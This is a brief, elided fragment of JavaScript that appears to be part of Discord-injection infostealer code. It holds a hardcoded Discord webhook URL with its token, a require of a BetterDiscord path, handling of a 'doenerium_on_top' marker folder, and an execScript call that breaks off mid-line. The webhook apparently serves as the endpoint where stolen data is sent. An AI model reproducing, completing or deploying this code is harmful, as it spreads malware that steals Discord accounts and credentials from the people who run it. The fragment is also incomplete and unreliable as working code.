...
const config = {
  webhook: 'https://discord.com/api/webhooks/993092528201027584/_yy6rBEEDRrqzbiHfiQeq0DXfwUzEizV4dUH-eI3uQ3kHqZI4cx8tX8oKXtnoi0R212-',
...
if (fs.existsSync(bdPath)) require(bdPath);`;
  ...
  if (!fs.existsSync(path.join(__dirname, 'doenerium_on_top'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'doenerium_on_top'));
  execScript(
